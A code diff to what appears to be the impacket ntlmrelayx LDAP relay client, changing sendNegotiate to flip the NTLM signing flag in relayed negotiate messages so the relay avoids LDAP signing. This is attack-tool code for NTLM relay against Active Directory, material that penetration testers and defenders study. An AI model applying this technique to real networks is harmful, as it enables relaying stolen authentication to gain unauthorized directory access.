@@ -30,7 +30,7 @@ except ImportError:
 
 from impacket.examples.ntlmrelayx.clients import ProtocolClient
 from impacket.nt_errors import STATUS_SUCCESS, STATUS_ACCESS_DENIED
-from impacket.ntlm import NTLMAuthChallenge
+from impacket.ntlm import NTLMAuthChallenge, NTLMAuthNegotiate, NTLMSSP_NEGOTIATE_SIGN
 from impacket.spnego import SPNEGO_NegTokenResp
 
 PROTOCOL_CLIENT_CLASSES = ["LDAPRelayClient", "LDAPSRelayClient"]
@@ -60,7 +60,12 @@ class LDAPRelayClient(ProtocolClient):
         self.session.open(False)
 
     def sendNegotiate(self, negotiateMessage):
-        self.negotiateMessage = negotiateMessage
+        #Remove the message signing flag
+        #For LDAP this is required otherwise it triggers LDAP signing
+        negoMessage = NTLMAuthNegotiate()
+        negoMessage.fromString(negotiateMessage)
+        negoMessage['flags'] ^= NTLMSSP_NEGOTIATE_SIGN
+        self.negotiateMessage = str(negoMessage)
 
         with self.session.lock:
             if not self.session.sasl_in_progress:
